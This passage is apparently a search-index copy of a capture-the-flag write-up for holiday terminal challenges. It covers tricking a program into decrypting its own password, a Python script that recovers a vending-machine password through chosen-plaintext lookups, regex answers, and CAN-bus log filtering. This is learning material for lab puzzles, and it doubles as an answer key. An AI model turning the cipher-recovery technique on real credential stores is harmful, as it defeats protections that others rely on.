/home/elf/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician Let's modify the conf by cipying the value of the password field to the username field. We see that the username has been decrypted. We got the password! elf@b3eaa0c05001 ~/lab $ vi lights.conf elf@b3eaa0c05001 ~/lab $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 elf@b3eaa0c05001 ~/lab $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, Computer-TurnLightsOn What do you enter? > Computer-TurnLightsOn Checking...... That would have turned on the lights! If you've figured out the real password, be sure you run /home/elf/lights Let's come out of the lab directory and enter the password in the real program. elf@b3eaa0c05001 ~/lab $ cd .. elf@b3eaa0c05001 ~ $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician What do you enter? > Computer-TurnLightsOn Checking...... Lights on! Rejoice Yay! we helped Bushy Evergreen with the lights!","title":"Speaker Lights On"},{"location":"terminals/terminal5/#5-speaker-lights-on","text":"","title":"5) Speaker Lights On"},{"location":"terminals/terminal5/#chat-with-bushy-evergreen","text":"Hey, you want to help me figure out the light switch too? Those come in handy sometimes. The password we need is in the lights.conf file, but it seems to be encrypted. There's another instance of the program and configuration in ~/lab/ you can play around with. What if we set the user name to an encrypted value?","title":"Chat with Bushy Evergreen"},{"location":"terminals/terminal5/#hints-courtesy-bushy-evergreen","text":"","title":"Hints Courtesy Bushy Evergreen"},{"location":"terminals/terminal5/#letting-a-program-decrypt-for-you","text":"While you have to use the lights program in /home/elf/ to turn the lights on, you can delete parts in /home/elf/lab/.","title":"Letting a Program Decrypt for You"},{"location":"terminals/terminal5/#solution","text":"let's analyse the lights program in the lab. We see that the conf file has two fields username and password . Help us get into the Speaker Unpreparedness Room! The door is controlled by ./door, but it needs a password! If you can figure out the password, it'll open the door right up! password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 Oh, and if you have extra time, maybe you can turn on the lights with ./lights activate the vending machines with ./vending-machines? Those are a little trickier, they have configuration files, but it'd help us a lot! (You can do one now and come back to do the others later if you want) We copied edit-able versions of everything into the ./lab/ folder, in case you want to try EDITING or REMOVING the configuration files to see how the binaries react. Note: These don't require low-level reverse engineering, so you can put away IDA and Ghidra (unless you WANT to use them!) elf@b3eaa0c05001 ~ $ ls door lab lights lights.conf vending-machines vending-machines.json elf@b3eaa0c05001 ~ $ cd lab/ elf@b3eaa0c05001 ~/lab $ ls door lights lights.conf vending-machines vending-machines.json elf@b3eaa0c05001 ~/lab $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: elf-technician When we run the program we see the following lines which state selected fields decrypted and the username is also displayed on the screen. What if the same decryption program was used to deprypt the username and password? elf@b3eaa0c05001 ~ $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician Let's modify the conf by cipying the value of the password field to the username field. We see that the username has been decrypted. We got the password! elf@b3eaa0c05001 ~/lab $ vi lights.conf elf@b3eaa0c05001 ~/lab $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 elf@b3eaa0c05001 ~/lab $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, Computer-TurnLightsOn What do you enter? > Computer-TurnLightsOn Checking...... That would have turned on the lights! If you've figured out the real password, be sure you run /home/elf/lights Let's come out of the lab directory and enter the password in the real program. elf@b3eaa0c05001 ~/lab $ cd .. elf@b3eaa0c05001 ~ $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician What do you enter? > Computer-TurnLightsOn Checking...... Lights on!","title":"Solution"},{"location":"terminals/terminal5/#rejoice","text":"Yay! we helped Bushy Evergreen with the lights!","title":"Rejoice"},{"location":"terminals/terminal6/","text":"6) Speaker Vending Machine On Chat with Bushy Evergreen So hey, if you want, there's one more challenge. You see, there's a vending machine in there that the speakers like to use sometimes. Play around with ./vending_machines in the lab folder. You know what might be worth trying? Delete or rename the config file and run it. Then you could set the password yourself to AAAAAAAA or BBBBBBBB. If the encryption is simple code book or rotation ciphers, you'll be able to roll back the original password. Hints Courtesy Bushy Evergreen Lookup Table For polyalphabetic ciphers, if you have control over inputs and visibilty of outputs, lookup tables can save the day. Solution After trying out a few different passwords such as \"AAAAA\" and \"BBBBB\" in the lab directory we see that the encryption seems to depend on the position of the letter alone. So if we could somehow get a mapping of plain text to cipher text something like the below <!-- L in position 4 in plain text translates to the letter x in cipher text, Z in position 1 in plain text translates to the letter K in cipher text --> {L-4:x, Z-1:K,...} we could then use this mapping to reverse the cipher text. The below python program does just that. It takes 3-4 minutes to execute. # import required modules import string import os import json d={} # this is the encrypted password for which we need to find the plain text reqd_passwd=\"LVEdQPpBwr\" # Since the password is 10 characters log, we can try guesses like AAAAAAAAAA, aaaaaaaaaa for all letters all_letters = list(string.ascii_letters) for letter in all_letters: guess = letter*10 print(guess) cmd ='{ echo \"abc\"; echo %s; } | ./vending-machines' % (guess,) # delete the config file so that when we run the program and input our password guess, a new config file will be created containing the encrypted value of the password os.system(\"rm vending-machines.json\") # run the program and input our guess as the password os.system(cmd) # open the config file and read the encrypted password field data = json.load(open(\"vending-machines.json\",\"r\")) passwd = data[\"password\"] print(passwd) # We create a dictionary(lookup table) which maps key <plain text-position> and value <cipher text> for pos in range(len(passwd)): key=letter+\"-\"+str(pos+1) d[key]=passwd[pos] print(d) # We can save the mappings to a file if needed with open(\"mappings.txt\",\"w\") as fw: fw.write(str(d)) # use the lookup table created to serach for values in the required password and print out the keys for pos,p in enumerate(reqd_passwd): for k,v in d.items(): if v ==p and k.split(\"-\")[1]==str(pos+1): print(k) The output of the program of the program is as below. We have successfully found 9 out of the 10 characters in the password! In our program we have created a lookup table of only letters. What if there are numbers too in the password? We can modify the python script to include numbers or we could just try out various numbers for the last character of the password. We find that the password is CandyCane1 Rejoice Yay! we helped Bushy Evergreen with the vending machine!","title":"Speaker Vending Machine On"},{"location":"terminals/terminal6/#6-speaker-vending-machine-on","text":"","title":"6) Speaker Vending Machine On"},{"location":"terminals/terminal6/#chat-with-bushy-evergreen","text":"So hey, if you want, there's one more challenge. You see, there's a vending machine in there that the speakers like to use sometimes. Play around with ./vending_machines in the lab folder. You know what might be worth trying? Delete or rename the config file and run it. Then you could set the password yourself to AAAAAAAA or BBBBBBBB. If the encryption is simple code book or rotation ciphers, you'll be able to roll back the original password.","title":"Chat with Bushy Evergreen"},{"location":"terminals/terminal6/#hints-courtesy-bushy-evergreen","text":"","title":"Hints Courtesy Bushy Evergreen"},{"location":"terminals/terminal6/#lookup-table","text":"For polyalphabetic ciphers, if you have control over inputs and visibilty of outputs, lookup tables can save the day.","title":"Lookup Table"},{"location":"terminals/terminal6/#solution","text":"After trying out a few different passwords such as \"AAAAA\" and \"BBBBB\" in the lab directory we see that the encryption seems to depend on the position of the letter alone. So if we could somehow get a mapping of plain text to cipher text something like the below <!-- L in position 4 in plain text translates to the letter x in cipher text, Z in position 1 in plain text translates to the letter K in cipher text --> {L-4:x, Z-1:K,...} we could then use this mapping to reverse the cipher text. The below python program does just that. It takes 3-4 minutes to execute. # import required modules import string import os import json d={} # this is the encrypted password for which we need to find the plain text reqd_passwd=\"LVEdQPpBwr\" # Since the password is 10 characters log, we can try guesses like AAAAAAAAAA, aaaaaaaaaa for all letters all_letters = list(string.ascii_letters) for letter in all_letters: guess = letter*10 print(guess) cmd ='{ echo \"abc\"; echo %s; } | ./vending-machines' % (guess,) # delete the config file so that when we run the program and input our password guess, a new config file will be created containing the encrypted value of the password os.system(\"rm vending-machines.json\") # run the program and input our guess as the password os.system(cmd) # open the config file and read the encrypted password field data = json.load(open(\"vending-machines.json\",\"r\")) passwd = data[\"password\"] print(passwd) # We create a dictionary(lookup table) which maps key <plain text-position> and value <cipher text> for pos in range(len(passwd)): key=letter+\"-\"+str(pos+1) d[key]=passwd[pos] print(d) # We can save the mappings to a file if needed with open(\"mappings.txt\",\"w\") as fw: fw.write(str(d)) # use the lookup table created to serach for values in the required password and print out the keys for pos,p in enumerate(reqd_passwd): for k,v in d.items(): if v ==p and k.split(\"-\")[1]==str(pos+1): print(k) The output of the program of the program is as below. We have successfully found 9 out of the 10 characters in the password! In our program we have created a lookup table of only letters. What if there are numbers too in the password? We can modify the python script to include numbers or we could just try out various numbers for the last character of the password. We find that the password is CandyCane1","title":"Solution"},{"location":"terminals/terminal6/#rejoice","text":"Yay! we helped Bushy Evergreen with the vending machine!","title":"Rejoice"},{"location":"terminals/terminal7/","text":"7) Regex Toy Sorting Chat with Minty Candycane Hey there, KringleCon attendee! I'm Minty Candycane! I'm working on fixing the Present Sort-O-Matic. The Sort-O-Matic uses JavaScript regular expressions to sort presents apart from misfit toys, but it's not working right. With some tools, regexes need / at the beginning and the ends, but they aren't used here. You can find a regular expression cheat sheet here if you need it. You can use this regex interpreter to test your regex against the required Sort-O-Matic patterns. Do you think you can help me fix it? Hints Courtesy Minty Candycane JavaScript Regex Cheat Sheet Handy quick reference for JS regular expression construction: https://www.debuggex.com/cheatsheet/regex/javascript Regex Practice Here's a place to try out your JS Regex expressions: https://regex101.com/ Solution 1.Create a Regex That Matches All Digits Create a regular expression that will only match any string containing at least one digit. Answer: \\d+ 2.Create a Regex That Matches 3 or More Alpha Characters Ignoring Case Create a regular expression that will only match only alpha characters A-Z of at least 3 characters in length or greater while ignoring case. Answer: [a-zA-Z]{3} 3.Create a Regex That Matches Two Consecutive Lowercase a-z or numeric characters. Create a regular expression that will only match at least two consecutive lowercase a-z or numeric characters. Answer: [a-z0-9]{2} 4.Any two characters that are not uppercase A-L or 1-5 Create a regular expression that will only match any two characters that are NOT uppercase A through L and NOT numbers 1 through 5. Answer: [^A-L1-5]{2} 5.Create a Regex To Match a String of 3 Characters in Length or More Composed of ONLY Digits Create a regular expression that only matches if the entire string is composed of entirely digits and is at least 3 characters in length. Answer: ^\\d{3,}$ 6.Create A Regex To Match Multiple Hour:Minute:Second Time Formats Only Create a regular expression that only matches if the entire string is a valid Hour, Minute and Seconds time format similar to the following: 12:24:53 1:05:24 23:02:43 08:04:10 However, the following would be invalid: 25:30:86 A1:E4:B5 B2:13:4A 32:24:53 08:74:53 12:5:24 Use anchors or boundary markers to avoid matching other surrounding strings. Answer: (^(0?\\d|1\\d|2[1-3])(:[0-5]\\d){2}$) 7.Create A Regular Expression That Matches The MAC Address Format Only While Ignoring Case Create a regular expression that only matches if the entire string is a MAC address. For example: 00:0a:95:9d:68:16 76:A4:5A:D2:69:93 B8:13:13:D1:18:EC 95:ce:00:4a:22:df However, the following would be examples of >invalid MAC Addresses: 97:z2:gf:c4:02:c2 de:140:130:69:7_-bd C0:HH:EE:50:B7:C3 Use anchors or boundary markers to avoid matching other surrounding strings. Answer: ^([0-9a-fA-F]{2}:){5}([0-9a-fA-F]{2})$ 8.Create A Regex That Matches Multiple Day, Month, and Year Date Formats Only Create a regular expression that only matches one of the three following day, month, and four digit year formats: 10/01/1978 01.10.1987 14-12-1991 However, the following values would be invalid formats: 05/25/89 12-32-1989 01.1.1989 1/1/1 Use anchors or boundary markers to avoid matching other surrounding strings. Answer: ((^[0-2]\\d|3[0-1])[/\\.-](0\\d|1[0-2])[/\\.-](1\\d{3})$) Rejoice Yay! we helped Minty Candycane!","title":"Regex Toy Sorting"},{"location":"terminals/terminal7/#7-regex-toy-sorting","text":"","title":"7) Regex Toy Sorting"},{"location":"terminals/terminal7/#chat-with-minty-candycane","text":"Hey there, KringleCon attendee! I'm Minty Candycane! I'm working on fixing the Present Sort-O-Matic. The Sort-O-Matic uses JavaScript regular expressions to sort presents apart from misfit toys, but it's not working right. With some tools, regexes need / at the beginning and the ends, but they aren't used here. You can find a regular expression cheat sheet here if you need it. You can use this regex interpreter to test your regex against the required Sort-O-Matic patterns. Do you think you can help me fix it?","title":"Chat with Minty Candycane"},{"location":"terminals/terminal7/#hints-courtesy-minty-candycane","text":"","title":"Hints Courtesy Minty Candycane"},{"location":"terminals/terminal7/#javascript-regex-cheat-sheet","text":"Handy quick reference for JS regular expression construction: https://www.debuggex.com/cheatsheet/regex/javascript","title":"JavaScript Regex Cheat Sheet"},{"location":"terminals/terminal7/#regex-practice","text":"Here's a place to try out your JS Regex expressions: https://regex101.com/","title":"Regex Practice"},{"location":"terminals/terminal7/#solution","text":"1.Create a Regex That Matches All Digits Create a regular expression that will only match any string containing at least one digit. Answer: \\d+ 2.Create a Regex That Matches 3 or More Alpha Characters Ignoring Case Create a regular expression that will only match only alpha characters A-Z of at least 3 characters in length or greater while ignoring case. Answer: [a-zA-Z]{3} 3.Create a Regex That Matches Two Consecutive Lowercase a-z or numeric characters. Create a regular expression that will only match at least two consecutive lowercase a-z or numeric characters. Answer: [a-z0-9]{2} 4.Any two characters that are not uppercase A-L or 1-5 Create a regular expression that will only match any two characters that are NOT uppercase A through L and NOT numbers 1 through 5. Answer: [^A-L1-5]{2} 5.Create a Regex To Match a String of 3 Characters in Length or More Composed of ONLY Digits Create a regular expression that only matches if the entire string is composed of entirely digits and is at least 3 characters in length. Answer: ^\\d{3,}$ 6.Create A Regex To Match Multiple Hour:Minute:Second Time Formats Only Create a regular expression that only matches if the entire string is a valid Hour, Minute and Seconds time format similar to the following: 12:24:53 1:05:24 23:02:43 08:04:10 However, the following would be invalid: 25:30:86 A1:E4:B5 B2:13:4A 32:24:53 08:74:53 12:5:24 Use anchors or boundary markers to avoid matching other surrounding strings. Answer: (^(0?\\d|1\\d|2[1-3])(:[0-5]\\d){2}$) 7.Create A Regular Expression That Matches The MAC Address Format Only While Ignoring Case Create a regular expression that only matches if the entire string is a MAC address. For example: 00:0a:95:9d:68:16 76:A4:5A:D2:69:93 B8:13:13:D1:18:EC 95:ce:00:4a:22:df However, the following would be examples of >invalid MAC Addresses: 97:z2:gf:c4:02:c2 de:140:130:69:7_-bd C0:HH:EE:50:B7:C3 Use anchors or boundary markers to avoid matching other surrounding strings. Answer: ^([0-9a-fA-F]{2}:){5}([0-9a-fA-F]{2})$ 8.Create A Regex That Matches Multiple Day, Month, and Year Date Formats Only Create a regular expression that only matches one of the three following day, month, and four digit year formats: 10/01/1978 01.10.1987 14-12-1991 However, the following values would be invalid formats: 05/25/89 12-32-1989 01.1.1989 1/1/1 Use anchors or boundary markers to avoid matching other surrounding strings. Answer: ((^[0-2]\\d|3[0-1])[/\\.-](0\\d|1[0-2])[/\\.-](1\\d{3})$)","title":"Solution"},{"location":"terminals/terminal7/#rejoice","text":"Yay! we helped Minty Candycane!","title":"Rejoice"},{"location":"terminals/terminal8/","text":"8)CAN-Bus Investigation Chat with Wunorse Openslae Hey Santa! Those tweaks you made to the sled just don\u2019t seem right to me. I can\u2019t figure out what\u2019s wrong, but maybe you can check it out to fix it. Hints Courtesy Wunorse Openslae Filtering Text You can hide lines you don't want to see with commands like cat file.txt | grep -v badstuff CAN Bus Talk Chris Elgee is talking about how CAN traffic works right now! Solution Let's understand what we need to dohere first. looks like we need to find the unlock signal. MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX00OkxxddcddxxkOO0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMWXOxoc:c.;cccccc.ccccc:.:c:ldxOXMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMXkoc',ccccc:.:ccccc.ccccc.;cccc,'::cdOXMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMM0xc:cccc,':cccc::ccccccccccccccc:.;cccccc:lxXMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMNkl,',:ccccc;;ccccccccccccccccccccc::cccccc:,',:lOWMMMMMMMMMMMMM MMMMMMMMMMMMNxccccc;';cccccccccccccccccccccccccccccccccc;':cccccckWMMMMMMMMMMM MMMMMMMMMMNdcccccc:..;cccccccccccccccccccccccccccccccccccccccccccc:kWMMMMMMMMM MMMMMMMMM0c,,,,:cccc;..;cccccccccccccccccccccccccccccccccccccc:,,,;:lKMMMMMMMM MMMMMMMWd:cccc;:cccccc;..,cccccccccccccccccccccccccccccccccccc;:cccccckMMMMMMM MMMMMMNlcccccccccccccccc:..,:ccccccccccccccccccccccccccccccccccccccccc:oWMMMMM MMMMMNc,,,,,:ccccccccccccc:..':cccccccccccccccccccccccccccccccccc:,,,,,;oWMMMM MMMMWoccccc::ccccccccccccccc:'.':cccccccccccccccccccccccccccccccc::ccccccxMMMM MMMMkccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccccc:0MMM MMMN::cccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccc:cWMM MMMk,,,,,:cccccccccccccccccccccccc:,..;ccccccccccccccccccccccccccccc:,,,,,;0MM MMMlccccccccccccccccccccccccccccccccc,.;cccccccccccccccccccccccccccccccccccdMM MMW:ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccclMM MMWOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM Welcome to the CAN bus terminal challenge! In your home folder, there's a CAN bus capture from Santa's sleigh. Some of the data has been cleaned up, so don't worry - it isn't too noisy. What you will see is a record of the engine idling up and down. Also in the data are a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK? We'd like to encode another key mechanism. Find the decimal portion of the timestamp of the UNLOCK code in candump.log and submit it to ./runtoanswer! (e.g., if the timestamp is 123456.112233, please submit 112233) The CAN bus signal logs are of the form ID#MESSAGE. Let's filter out the values using grep -v command as hinted. elf@52020824240b:~$ ls candump.log runtoanswer elf@52020824240b:~$ head candump.log (1608926660.800530) vcan0 244#0000000116 (1608926660.812774) vcan0 244#00000001D3 (1608926660.826327) vcan0 244#00000001A6 (1608926660.839338) vcan0 244#00000001A3 (1608926660.852786) vcan0 244#00000001B4 (1608926660.866754) vcan0 244#000000018E (1608926660.879825) vcan0 244#000000015F (1608926660.892934) vcan0 244#0000000103 (1608926660.904816) vcan0 244#0000000181 (1608926660.920799) vcan0 244#000000015F elf@52020824240b:~$ cat candump.log | grep -v 244 (1608926660.970738) vcan0 188#00000000 (1608926661.474018) vcan0 188#00000000 (1608926661.978259) vcan0 188#00000000 (1608926662.478577) vcan0 188#00000000 (1608926662.977733) vcan0 188#00000000 (1608926663.483216) vcan0 188#00000000 (1608926663.989726) vcan0 188#00000000 (1608926664.491259) vcan0 188#00000000 (1608926664.626448) vcan0 19B#000000000000 (1608926664.996093) vcan0 188#00000000 (1608926665.499007) vcan0 188#00000000 (1608926666.009926) vcan0 188#00000000 (1608926666.512371) vcan0 188#00000000 (1608926667.013385) vcan0 188#00000000 (1608926667.520201) vcan0 188#00000000 (1608926668.022800) vcan0 188#00000000 (1608926668.530024) vcan0 188#00000000 (1608926669.036851) vcan0 188#00000000 (1608926669.544057) vcan0 188#00000000 (1608926670.046480) vcan0 188#00000000 (1608926670.550541) vcan0 188#00000000 (1608926671.055065) vcan0 188#00000000 (1608926671.122520) vcan0 19B#00000F000000 (1608926671.558329) vcan0 188#00000000 (1608926672.063221) vcan0 188#00000000 (1608926672.568871) vcan0 188#00000000 (1608926673.072611) vcan0 188#00000000 (1608926673.579853) vcan0 188#00000000 (1608926674.086447) vcan0 188#00000000 (1608926674.092148) vcan0 19B#000000000000 (1608926674.589954) vcan0 188#00000000 (1608926675.099853) vcan0 188#00000000 (1608926675.605010) vcan0 188#00000000 (1608926676.110132) vcan0 188#00000000 (1608926676.617537) vcan0 188#00000000 (1608926677.121567) vcan0 188#00000000 (1608926677.630561) vcan0 188#00000000 (1608926678.141434) vcan0 188#00000000 elf@52020824240b:~$ cat candump.log | grep -v 244 | grep -v 188 (1608926664.626448) vcan0 19B#000000000000 (1608926671.122520) vcan0 19B#00000F000000 (1608926674.092148) vcan0 19B#000000000000 After filtering out values that are repeated multiple times we see these three signals. Recall teh line from the MOTD which says Also in the data are a LOCK signal, an UNLOCK signal, and one more LOCK. So this signal must be the unlock signal (1608926671.122520) vcan0 19B#00000F000000 . Let's submit the timestamp. elf@52020824240b:~$ ./runtoanswer There are two LOCK codes and one UNLOCK code in the log. What is the decimal portion of the UNLO CK timestamp? (e.g., if the timestamp of the UNLOCK were 1608926672.391456, you would enter 391456. > 122520 Your answer: 122520 Checking.... Your answer is correct! Rejoice Yay! we helped Wunorse Openslae!","title":"CAN-Bus Investigation"},{"location":"terminals/terminal8/#8can-bus-investigation","text":"","title":"8)CAN-Bus Investigation"},{"location":"terminals/terminal8/#chat-with-wunorse-openslae","text":"Hey Santa! Those tweaks you made to the sled just don\u2019t seem right to me. I can\u2019t figure out what\u2019s wrong, but maybe you can check it out to fix it.","title":"Chat with Wunorse Openslae"},{"location":"terminals/terminal8/#hints-courtesy-wunorse-openslae","text":"","title":"Hints Courtesy Wunorse Openslae"},{"location":"terminals/terminal8/#filtering-text","text":"You can hide lines you don't want to see with commands like cat file.txt | grep -v badstuff","title":"Filtering Text"},{"location":"terminals/terminal8/#can-bus-talk","text":"Chris Elgee is talking about how CAN traffic works right now!","title":"CAN Bus Talk"},{"location":"terminals/terminal8/#solution","text":"Let's understand what we need to dohere first. looks like we need to find the unlock signal. MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX00OkxxddcddxxkOO0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMWXOxoc:c.;cccccc.ccccc:.:c:ldxOXMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMXkoc',ccccc:.:ccccc.ccccc.;cccc,'::cdOXMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMM0xc:cccc,':cccc::ccccccccccccccc:.;cccccc:lxXMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMNkl,',:ccccc;;ccccccccccccccccccccc::cccccc:,',:lOWMMMMMMMMMMMMM MMMMMMMMMMMMNxccccc;';cccccccccccccccccccccccccccccccccc;':cccccckWMMMMMMMMMMM MMMMMMMMMMNdcccccc:..;cccccccccccccccccccccccccccccccccccccccccccc:kWMMMMMMMMM MMMMMMMMM0c,,,,:cccc;..;cccccccccccccccccccccccccccccccccccccc:,,,;:lKMMMMMMMM MMMMMMMWd:cccc;:cccccc;..,cccccccccccccccccccccccccccccccccccc;:cccccckMMMMMMM MMMMMMNlcccccccccccccccc:..,:ccccccccccccccccccccccccccccccccccccccccc:oWMMMMM MMMMMNc,,,,,:ccccccccccccc:..':cccccccccccccccccccccccccccccccccc:,,,,,;oWMMMM MMMMWoccccc::ccccccccccccccc:'.':cccccccccccccccccccccccccccccccc::ccccccxMMMM MMMMkccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccccc:0MMM MMMN::cccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccc:cWMM MMMk,,,,,:cccccccccccccccccccccccc:,..;ccccccccccccccccccccccccccccc:,,,,,;0MM MMMlccccccccccccccccccccccccccccccccc,.;cccccccccccccccccccccccccccccccccccdMM MMW:ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccclMM MMWOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM Welcome to the CAN bus terminal challenge! In your home folder, there's a CAN bus capture from Santa's sleigh. Some of the data has been cleaned up, so don't worry - it isn't too noisy. What you will see is a record of the engine idling up and down. Also in the data are a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK? We'd like to encode another key mechanism. Find the decimal portion of the timestamp of the UNLOCK code in candump.log and submit it to ./runtoanswer! (e.g., if the timestamp is 123456.112233, please submit 112233) The CAN bus signal logs are of the form ID#MESSAGE. Let's filter out the values using grep -v command as hinted. elf@52020824240b:~$ ls candump.log runtoanswer elf@52020824240b:~$ head candump.log (1608926660.800530) vcan0 244#0000000116 (1608926660.812774) vcan0 244#00000001D3 (1608926660.826327) vcan0 244#00000001A6 (1608926660.839338) vcan0 244#00000001A3 (1608926660.852786) vcan0 244#00000001B4 (1608926660.866754) vcan0 244#000000018E (1608926660.879825) vcan0 244#000000015F (1608926660.892934) vcan0 244#0000000103 (1608926660.904816) vcan0 244#0000000181 (1608926660.920799) vcan0 244#000000015F elf@52020824240b:~$ cat candump.log | grep -v 244 (1608926660.970738) vcan0 188#00000000 (1608926661.474018) vcan0 188#00000000 (1608926661.978259) vcan0 188#00000000 (1608926662.478577) vcan0 188#00000000 (1608926662.977733) vcan0 188#00000000 (1608926663.483216) vcan0 188#00000000 (1608926663.989726) vcan0 188#00000000 (1608926664.491259) vcan0 188#00000000 (1608926664.626448) vcan0 19B#000000000000 (1608926664.996093) vcan0 188#00000000 (1608926665.499007) vcan0 188#00000000 (1608926666.009926) vcan0 188#00000000 (1608926666.512371) vcan0 188#00000000 (1608926667.013385) vcan0 188#00000000 (1608926667.520201) vcan0 188#00000000 (1608926668.022800) vcan0 188#00000000 (1608926668.530024) vcan0 188#00000000 (1608926669.036851) vcan0 188#00000000 (1608926669.544057) vcan0 188#00000000 (1608926670.046480) vcan0 188#00000000 (1608926670.550541) vcan0 188#00000000 (1608926671.055065) vcan0 188#00000000 (1608926671.122520) vcan0 19B#00000F000000 (1608926671.558329) vcan0 188#00000000 (1608926672.063221) vcan0 188#00000000 (1608926672.568871) vcan0 188#00000000 (1608926673.072611) vcan0 188#00000000 (1608926673.579853) vcan0 188#00000000 (1608926674.086447) vcan0 188#00000000 (1608926674.092148) vcan0 19B#000000000000 (1608926674.589954) vcan0 188#00000000 (1608926675.099853) vcan0 188#00000000 (1608926675.605010) vcan0 188#00000000 (1608926676.110132) vcan0 188#00000000 (1608926676.617537) vcan0 188#00000000 (1608926677.121567) vcan0 188#00000000 (1608926677.630561) vcan0 188#00000000 (1608926678.141434) vcan0 188#00000000 elf@52020824240b:~$ cat candump.log | grep -v 244 | grep -v 188 (1608926664.626448) vcan0 19B#000000000000 (1608926671.122520) vcan0 19B#00000F000000 (1608926674.092148) vcan0 19B#000000000000 After filtering out values that are repeated multiple times we see these three signals. Recall teh line from the MOTD which says Also in the data are a LOCK signal, an UNLOCK signal, and one more LOCK. So this signal must be the unlock signal (1608926671.122520) vcan0 19B#00000F000000 . Let's submit the timestamp. elf@52020824240b:~$ ./runtoanswer There are two LOCK codes and one UNLOCK code in the log. What is the decimal portion of the UNLO CK timestamp? (e.g., if the timestamp of the UNLOCK were 1608926672.391456, you would enter 391456. > 122520 Your answer: 122520 Checking.... Your answer is correct!","title":"Solution"},{"location":"terminals/terminal8/#rejoice","text":"Yay! we helped Wunorse Openslae!","title":"Rejoice"}]}